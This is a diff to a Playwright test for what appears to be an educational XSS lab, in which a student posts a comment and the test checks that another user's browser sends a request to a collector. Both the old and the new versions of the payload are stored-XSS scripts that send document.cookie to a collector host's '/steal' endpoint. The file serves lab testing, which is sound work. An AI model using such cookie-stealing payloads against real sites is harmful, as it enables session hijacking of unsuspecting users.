@@ -87,7 +87,7 @@ def test_all_page_layouts(tmp_path,monkeypatch):
             student_page.get_by_role('link',name='Lab 總覽',exact=True).click()
             student_page.get_by_role('link',name='進入 XSS Lab',exact=True).click()
             student_page.wait_for_url(origins['xss']+'/')
-            payload="<script>const c=document.cookie.split('; ').find(x=>x.startsWith('xss_lab_session='));if(c)new Image().src='"+origins['collector']+"/steal?cookie='+encodeURIComponent(c);</script>"
+            payload='<script>fetch("'+origins['collector']+'/steal?cookie=" + document.cookie);</script>'
             student_page.locator('[name=content]').fill(payload)
             student_page.get_by_role('button',name='送出留言',exact=True).click()
             with member_page.expect_request(lambda r:'/steal?cookie=' in r.url):
